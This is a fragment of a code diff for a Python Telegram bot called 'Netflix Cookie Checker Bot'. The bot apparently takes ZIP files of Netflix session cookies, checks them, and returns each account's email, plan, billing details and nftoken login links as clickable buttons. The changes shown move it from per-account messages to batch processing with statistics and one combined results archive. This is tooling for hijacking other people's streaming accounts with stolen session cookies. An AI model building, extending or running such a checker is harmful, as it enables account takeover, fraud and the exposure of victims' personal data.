-            "expiry_formatted": format_expiry(expires),
-            "pc_link": f"https://www.netflix.com/browse?nftoken={token}",
-            "phone_link": f"https://www.netflix.com/unsupported?nftoken={token}",
-        }
-        
-        return result
-    except Exception as e:
-        print(f"Error in process_cookie_file: {e}")
-        return None
-
-async def send_account_message(update, context, result, index, total):
-    status_emoji = "✅" if "Active" in result["status"] else "❌" if "Canceled" in result["status"] else "🆓"
-    
-    if result["plan_type"] == "Premium":
-        plan_emoji = "🟣"
-    elif result["plan_type"] == "Standard":
-        plan_emoji = "🔵"
-    elif result["plan_type"] == "Basic":
-        plan_emoji = "🟢"
-    else:
-        plan_emoji = "⚪"
-    
-    time_left_str = "Unknown"
-    if result.get("expires"):
         try:
-            expiry_dt = datetime.fromtimestamp(result["expires"])
-            time_now = datetime.now()
-            time_left = expiry_dt - time_now
-            if time_left.total_seconds() > 0:
-                days = time_left.days
-                hours = time_left.seconds // 3600
-                minutes = (time_left.seconds % 3600) // 60
-                time_left_str = f"{days}d {hours}h {minutes}m"
-            else:
-                time_left_str = "⏰ EXPIRED"
+            shutil.rmtree(temp_dir)
         except:
             pass
-    
-    message = f"🎬 **Account #{index}/{total}**\n\n"
-    message += f"📧 **Email:** `{result['email']}`\n"
-    message += f"📊 **Status:** {status_emoji} {result['status']}\n"
-    message += f"🌍 **Country:** {result['country']}\n"
-    message += f"📦 **Plan:** {result['plan']} {plan_emoji} {result['plan_type']}\n"
-    message += f"📺 **Max Streams:** {result['maxStreams']}\n"
-    message += f"📅 **Member Since:** {result['memberSince']}\n"
-    message += f"💳 **Next Billing:** {result['nextBilling']}\n"
-    message += f"⏱️ **Expires:** {result['expiry_formatted']}\n"
-    message += f"⏳ **Time Left:** {time_left_str}\n\n"
-    message += "🔑 **NFToken Links:**"
-    
-    keyboard = [
-        [InlineKeyboardButton("💻 PC Link", url=result['pc_link'])],
-        [InlineKeyboardButton("📱 Phone Link", url=result['phone_link'])],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        message,
-        reply_markup=reply_markup,
-        parse_mode="Markdown"
-    )
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ **Error:** {str(e)}", parse_mode="Markdown")
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        print(f"Error: {context.error}")
-        if update and update.message:
-            await update.message.reply_text(
-                "❌ **An error occurred!**\n\nPlease try again later.",
-                parse_mode="Markdown"
-            )
-    except:
-        pass
+    print(f"Error: {context.error}")
 
 # ============ MAIN ============
 def main():
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ Please set BOT_TOKEN environment variable!")
-        return
-    
     try:
-        # Create application
         application = Application.builder().token(BOT_TOKEN).build()
         
-        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("help", help_command))
         application.add_handler(CommandHandler("about", about_command))
-        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(send_file|help|about|back)$"))
+        application.add_handler(CommandHandler("stats", stats_command))
+        application.add_handler(CommandHandler("resetstats", reset_stats_command))
+        application.add_handler(CallbackQueryHandler(button_callback, pattern="^(send_file|help|about|back|stats|reset_stats)$"))
         application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
         application.add_error_handler(error_handler)
         
         print("🤖 Netflix Cookie Checker Bot is running...")
-        print("Supported format: ZIP only")
-        print("Max file size: 5 MB")
-        print("Each account will be shown separately")
+        print(f"✅ Batch size: {BATCH_SIZE} files per batch")
+        print("📦 All results combined into ONE master ZIP")
+        print("📊 Final summary with all statistics")
+        print("🌐 Keep-alive server running")
         
-        # Run the bot with proper event loop handling
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        application.run_polling(allowed_updates=Update.ALL_TYPES)
         
-        try:
-            loop.run_until_complete(application.run_polling(allowed_updates=Update.ALL_TYPES))
-        except KeyboardInterrupt:
-            print("Bot stopped by user")
-        finally:
-            loop.close()
-            
     except Exception as e:
-        print(f"Error in main: {e}")
-        import traceback
-        traceback.print_exc()
+        print(f"Error: {e}")
 
 if __name__ == "__main__":
     main()
